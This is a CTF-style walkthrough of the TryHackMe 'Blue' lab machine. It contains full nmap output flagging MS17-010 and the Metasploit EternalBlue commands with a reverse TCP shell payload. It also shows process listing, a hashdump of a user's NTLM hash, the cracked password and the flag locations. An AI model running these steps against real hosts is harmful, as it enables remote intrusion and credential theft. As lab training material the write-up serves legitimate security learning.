# Blue Machine on tryhackme 

## r3c0n

1. Using nmap to detect all the ports in the system 
2. Command used `nmap -sV -vv --script vuln {machine_ip}`
	```
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-10 05:16 IST
NSE: Loaded 150 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 05:16
Completed NSE at 05:16, 10.01s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 05:16
Completed NSE at 05:16, 0.00s elapsed
Initiating Ping Scan at 05:16
Scanning 10.10.180.99 [2 ports]
Completed Ping Scan at 05:16, 0.31s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:16
Completed Parallel DNS resolution of 1 host. at 05:16, 0.04s elapsed
Initiating Connect Scan at 05:16
Scanning 10.10.180.99 [1000 ports]
Discovered open port 3389/tcp on 10.10.180.99
Discovered open port 139/tcp on 10.10.180.99
Discovered open port 135/tcp on 10.10.180.99
Discovered open port 445/tcp on 10.10.180.99
Discovered open port 49158/tcp on 10.10.180.99
Discovered open port 49153/tcp on 10.10.180.99
Discovered open port 49154/tcp on 10.10.180.99
Increasing send delay for 10.10.180.99 from 0 to 5 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.180.99 from 5 to 10 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.180.99 from 10 to 20 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 10.10.180.99 from 20 to 40 due to max_successful_tryno increase to 6
Increasing send delay for 10.10.180.99 from 40 to 80 due to max_successful_tryno increase to 7
Discovered open port 49160/tcp on 10.10.180.99
Discovered open port 49152/tcp on 10.10.180.99
Completed Connect Scan at 05:18, 65.92s elapsed (1000 total ports)
Initiating Service scan at 05:18
Scanning 9 services on 10.10.180.99
Service scan Timing: About 44.44% done; ETC: 05:20 (0:01:13 remaining)
Completed Service scan at 05:19, 103.75s elapsed (9 services on 1 host)
NSE: Script scanning 10.10.180.99.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 05:19
NSE: [firewall-bypass 10.10.180.99] lacks privileges.
NSE Timing: About 99.82% done; ETC: 05:20 (0:00:00 remaining)
NSE Timing: About 99.91% done; ETC: 05:20 (0:00:00 remaining)
Completed NSE at 05:20, 60.77s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 05:20
NSE: [tls-ticketbleed 10.10.180.99:49152] Not running due to lack of privileges.
NSE: [ssl-ccs-injection 10.10.180.99:3389] No response from server: ERROR
Completed NSE at 05:20, 11.53s elapsed
Nmap scan report for 10.10.180.99
Host is up, received conn-refused (0.22s latency).
Scanned at 2023-12-10 05:16:55 IST for 242s
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE            REASON  VERSION
135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
49158/tcp open  msrpc              syn-ack Microsoft Windows RPC
49160/tcp open  msrpc              syn-ack Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 05:20
Completed NSE at 05:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 05:20
Completed NSE at 05:20, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 252.63 seconds
```

## gan1ng acc3s$

1. We will be using metasploit to do that
2. command `use exploit/windows/smb/ms17_010_eternalblue`
3. set the rhost to the machine's ip using `set RHOSTS	{machine_ip}`
4. If you are using vpn to connect to a mahine don't forget to change lhost
5. not neccesary but if you want set payload using `set payload windows/x64/shell/reverse_tcp`
6. run it

## 3scal4t1ng
1. I have used the default payload so i didn't had to escalate the shell to meterpreter
2. run command `ps` to list all proccess running
```
Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 356   716   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 464   668   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 472   716   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 488   716   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 572   564   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 620   564   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 628   612   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 668   612   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 716   620   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 724   620   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 732   620   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 840   716   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 908   716   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 956   716   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1120  716   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1224  716   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1332  716   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1348  1332  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
 1376  716   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1452  716   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1524  716   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1676  716   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1764  716   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
 1972  716   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 2136  572   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 2156  840   WmiPrvSE.exe
 2332  2360  mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
 2360  716   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
 2416  716   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 2624  716   vds.exe               x64   0        NT AUTHORITY\SYSTEM
 2664  716   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 2756  716   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM 
```
3. from the default payload we were automatically escalated so in this step we didn't had to do anything

## Cr@ck1ng
1. after running command `hashdump` 
```
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
2. after cracking using john the password found in `alqfna22`

## F1nding fl@gs
1. flag1 was stored in the `C` directoryy
2. flag2 was stored in `system32/config`
3. flag3 was in documents directory
